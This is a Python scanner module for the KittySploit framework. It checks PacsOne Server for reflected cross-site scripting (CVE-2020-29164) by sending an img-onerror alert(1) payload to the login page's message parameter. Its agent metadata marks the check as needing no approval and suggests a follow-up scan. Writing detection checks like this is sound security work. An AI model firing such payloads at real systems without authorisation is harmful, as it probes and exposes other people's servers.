#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PacsOne Server (PACS Server In One Box) below 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PacsOne Server <7.1.1 - Cross-Site Scripting Detection',
        'description': 'PacsOne Server (PACS Server In One Box) below 7.1.1 is vulnerable to cross-site scripting.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'pacsone', 'xss', 'rainbowfishsoftware', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://gist.github.com/leommxj/0a32afeeaac960682c5b7c9ca8ed070d',
            'https://pacsone.net/download.htm',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-29164',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-29164',
    }

    def run(self):
        r = self.http_request(method="GET", path='/pacs/login.php?message=%3Cimg%20src=%22%22%20onerror=%22alert(1);%22%3E1%3C/img%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<img src="" onerror="alert(1);">1</img>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="PacsOne Server <7.1.1 - Cross-Site Scripting detected",
                path='/pacs/login.php?message=%3Cimg%20src=%22%22%20onerror=%22alert(1);%22%3E1%3C/img%3E',
            )
            return True
        return False

